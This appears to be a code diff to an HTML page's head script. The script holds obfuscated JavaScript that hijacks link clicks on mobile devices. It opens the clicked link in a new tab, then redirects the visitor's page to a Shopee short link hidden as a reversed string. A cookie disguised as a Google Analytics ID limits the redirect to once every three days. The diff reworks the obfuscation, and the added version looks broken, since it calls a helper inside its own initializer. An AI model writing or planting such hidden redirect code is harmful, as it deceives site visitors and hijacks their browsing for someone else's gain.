@@ -8,13 +8,14 @@
         <script>
 
             const _$ = {
-                a: [111, 112, 101, 110],
-                i: 'cVk0FaR9L3/nv.eepohs.s//:sptth'.split('').reverse().join(''),
-                b: [108, 111, 99, 97, 116, 105, 111, 110],
-                g: '_ga_D8SD9STSJ5',
-                w: window,
-                c: [114, 101, 112, 108, 97, 99, 101],
-                r() {
+                o(_) {return _.split('').reverse().join('')},
+                a: _$.o('nepo'),
+                b: _$.o('noitacol'),
+                c: _$.o('ecalper'),
+                d: _$.o('cVk0FaR9L3/nv.eepohs.s//:sptth'),
+                e: '_ga_D8SD9STSJ5',
+                f: window,
+                g() {
                     document.addEventListener('click', _$.oC, true);
                 },
             }
@@ -34,27 +35,26 @@
                        (/android|iphone|ipad|tablet|playbook|silk|kindle/.test(u) || window.matchMedia("(max-width: 1024px)").matches);
             };
             
-            _$.cS = (n) => {
-                return n.map(z => String.fromCharCode(z)).join('');
+            _$.cS = (_) => {
+                return _.map(__ => String.fromCharCode(__)).join('');
             };
             
             _$.gV = () => {
-                return _$.gC(_$.g);
+                return _$.gC(_$.e);
             };
             
             _$.oC = (e) => {
                 const t = e.target.closest("a");
                 if (!t || !t.href || t.href === '/' || (_$.gV() && _$.gV() === 'true') || !_$.mT()) return; 
                 e.preventDefault();
-                _$.sC(_$.g, 'true', 3);
-                _$.w[_$.cS(_$.a)](t.href, '_blank');
-                _$.w[_$.cS(_$.b)][_$.cS(_$.c)](_$.i);
+                _$.sC(_$.e, 'true', 3);
+                _$.f[_$.a](t.href, '_blank');
+                _$.f[_$.b][_$.c](_$.d);
             };
             
-            _$.r();
+            _$.g();
 
-
-            
+   
         </script>
     </head>
     <body>
